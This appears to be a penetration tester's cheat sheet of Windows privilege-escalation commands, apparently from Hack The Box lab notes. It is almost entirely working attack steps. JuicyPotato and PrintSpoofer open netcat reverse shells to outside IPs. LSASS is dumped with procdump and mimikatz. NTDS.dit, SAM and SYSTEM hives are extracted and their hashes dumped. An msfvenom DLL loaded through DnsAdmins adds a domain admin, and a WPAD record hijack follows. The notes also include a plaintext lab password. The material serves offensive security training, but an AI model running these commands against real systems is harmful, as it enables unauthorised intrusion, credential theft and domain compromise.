	Find some useful information on the network : 

```python
arp -a
route print
```

Enumerating Protections : 

```python
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

test app-locker security : 

```python
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

Get some useful information:
```python
tasklist /svc
set
systeminfo
wmic qfe
#or 
Get-HotFix | ft -AutoSize
```

Installed Programs :

```python
wmic product get name
#or 
Get-WmiObject -Class Win32_Product |  select Name, Version
```

Display Running Processes : 

```python
netstat -ano
```
Logged-In Users :
```python
query user
query session
```
Current user and privileges:
```python
echo %USERNAME%
whoami /priv
```

Get all group : 
```python
net localgroup
```

Get Password Policy & Other Account Information : 
```python
net accounts
net user
```

Listing Named Pipes : 
https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist
```python
pipelist.exe /accepteula
#or 
gci \\.\pipe\
#or
Get-ChildItem "\\.\pipe\" | Where-Object { -not $_.PsIsContainer } | ForEach-Object { Write-Output "Named Pipe: $($_.FullName)" }
```

enumerate the permissions : 
https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
download accesschk : 
```python
Invoke-WebRequest -Uri "http://10.10.16.100:8080/accesschk64.exe" -OutFile "C:\Users\htb-student\Desktop\accesschk64.exe"
```

```python 
accesschk /accepteula \\.\Pipe\lsass -v #for lsass
#with powershell 
.\accesschk64.exe \pipe\SQLLocal\SQLEXPRESS01 -v 
```

##### SeImpersonate and SeAssignPrimaryToken

PrintSpoofer : 
```python
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
```
Juicy potatoes :
```python
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
download netcat : 
```python
wget https://github.com/int0x33/nc.exe/blob/master/nc.exe

C:\Tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.16.100 8443 -e cmd"
```

##### SeDebugPrivilege

Dump LSASS: 

```python
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
https://github.com/ParrotSec/mimikatz/tree/master/x64
https://download.sysinternals.com/files/Procdump.zip

Tools : 
https://github.com/decoder-it/psgetsystem
command: 
```python
./psgetsys.ps1 ;[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```
https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC

##### SeTakeOwnershipPrivilege

```python
 Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

cmd /c dir /q 'C:\Department Shares\Private\IT'
```

```python
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```



#### Windows Built-in group

##### Backup Operators
https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

import module : 
```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Enabling SeBackupPrivilege :
```powershell
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
```

Copy Protected file  : 
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```
Can Also use Robocopy to copy file : 

https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
##### Attacking a Domain Controller - Copying NTDS.dit

```powershell
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit


```

Copying NTDS.dit Locally : 
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

##### Extract local account credentials : 
```powershell
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

##### Extracting ntds.dit with DS internal for the administrator user : 

https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1
```powershell
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

##### Extracting Hashes Using SecretsDump

```sh
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

##### Event Log Readers

```shell
net localgroup "Event Log Readers"

wevtutil qe Security /rd:true /f:text | Select-String "/user"

wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

```

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

#### DnsAdmins

```powershell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

Get-ADGroupMember -Identity DnsAdmins

dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

##### Finding User's SID
```powershell
wmic useraccount where name="netadm" get sid
```

##### Checking Permissions on DNS Service
```powershell
sc.exe sdshow DNS
```

Restart Dns service : 
```sh
sc stop dns
sc start dns
```

#### Using Mimilib.dll

www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html

#### Creating a WPAD Record

##### Disabling the Global Query Block List

```powershell
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

##### Adding a WPAD Record
```powershell
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```